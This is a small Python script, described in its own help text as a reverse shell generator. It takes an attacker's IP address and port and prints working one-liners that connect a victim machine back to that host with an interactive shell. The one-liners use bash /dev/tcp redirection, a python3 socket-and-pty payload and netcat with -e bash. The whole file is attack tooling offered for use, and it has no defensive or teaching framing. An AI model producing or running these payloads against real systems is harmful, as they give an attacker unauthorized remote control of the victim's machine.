#!/usr/bin/python3

import sys
import argparse


parser = argparse.ArgumentParser(description="Command line reverse shell generator")
parser.add_argument('ip', metavar='<attacker ip>', help='Attacker ip address to receive the connection back from victim machine')
parser.add_argument('-p', metavar='<attacker port>', help='Attacker port to listen on. Default = 1337', default='1337')
parser.add_argument('-m', metavar='method to use', default='bash,python3,nc', help='A comma seperated list of reverse shell methods. Default is bash,python3,nc ')
args = parser.parse_args()

port = args.p
ip = args.ip
methods = args.m.split(",")
print(methods)
possible_methods = {
	"bash": f"  bash -i >& /dev/tcp/{ip}/{port} 0>&1 \n  0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196 \n  /bin/bash -l > /dev/tcp/{ip}/{port} 0<&1 2>&1",
	"python3": f"  export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'",
	"nc" : f"  nc -e bash {ip} {port}",

}


for method in methods:
  if possible_methods.get(method):
    print(f'\n{method}: \n{possible_methods.get(method)}')
